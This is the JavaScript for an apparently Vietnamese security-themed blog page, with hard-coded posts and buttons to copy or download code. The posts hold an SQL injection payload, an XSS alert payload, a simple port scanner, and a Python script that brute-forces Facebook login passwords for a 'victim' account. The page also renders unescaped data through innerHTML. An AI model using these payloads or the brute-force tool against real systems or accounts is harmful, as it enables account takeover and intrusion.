// ================== POSTS DATA ==================
const posts = {
  news: [
    {
      title: "Lỗ hổng SQL Injection mới trong CMS X",
      content: "Một lỗ hổng SQL Injection nghiêm trọng vừa được phát hiện trong CMS X...",
      link: "https://example.com/sql-injection-news"
    },
    {
      title: "Rò rỉ dữ liệu từ một ngân hàng lớn",
      content: "Cơ sở dữ liệu của một ngân hàng đã bị lộ ra ngoài do cấu hình sai...",
      link: "https://example.com/data-leak"
    }
  ],
  tutorials: [
    {
      title: "SQL Injection cơ bản",
      content: "Hướng dẫn từng bước khai thác SQL Injection.",
      code: `# Ví dụ SQLi payload
' OR '1'='1`
    },
    {
      title: "Cross Site Scripting (XSS)",
      content: "Cách chèn script vào input và bypass filter.",
      code: `<script>alert('XSS');</script>`
    }
  ],
  tools: [
    {
      title: "Port Scanner",
      content: "Tool scan port đơn giản với Python.",
      code: `import socket

target = "127.0.0.1"
for port in range(1,1000):
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((target, port))
        print("Port open:", port)
    except:
        pass`
    },
    {
      title: "Brute Force Facebook",
      content: "Tool Python brute-force login Facebook (nghiên cứu).",
      code: `import requests

url = "https://facebook.com/login"
for pwd in ["123456", "password", "letmein"]:
    r = requests.post(url, data={"email":"victim","pass":pwd})
    if "Welcome" in r.text:
        print("Found password:", pwd)
        break`
    }
  ]
};

// ================== RENDER POSTS ==================
function renderPosts() {
  // News
  const newsContainer = document.getElementById("news");
  posts.news.forEach((post) => {
    newsContainer.innerHTML += `
      <div class="card">
        <h2>📰 ${post.title}</h2>
        <p>${post.content}</p>
        <a href="${post.link}" target="_blank">
          <button class="btn read-btn">📖 Read</button>
        </a>
      </div>`;
  });

  // Tutorials
  const tutorialContainer = document.getElementById("tutorials");
  posts.tutorials.forEach((post, index) => {
    tutorialContainer.innerHTML += `
      <div class="card">
        <h2>📚 ${post.title}</h2>
        <p>${post.content}</p>
        <pre><code>${post.code}</code></pre>
        <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
      </div>`;
  });

  // Tools
  const toolContainer = document.getElementById("tools");
  posts.tools.forEach((post, index) => {
    toolContainer.innerHTML += `
      <div class="card">
        <h2>🛠 ${post.title}</h2>
        <p>${post.content}</p>
        <pre><code>${post.code}</code></pre>
        <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
        <button class="btn download-btn" onclick="downloadCode(\`${post.code}\`, '${post.title.replace(/\s+/g, "_")}.py')">⬇ Download</button>
      </div>`;
  });
}

// ================== FUNCTIONS ==================
function copyCode(code) {
  navigator.clipboard.writeText(code).then(() => {
    alert("✅ Code copied to clipboard!");
  });
}

function downloadCode(code, filename) {
  const blob = new Blob([code], { type: "text/plain" });
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
  URL.revokeObjectURL(link.href);
}

// Run
document.addEventListener("DOMContentLoaded", renderPosts);
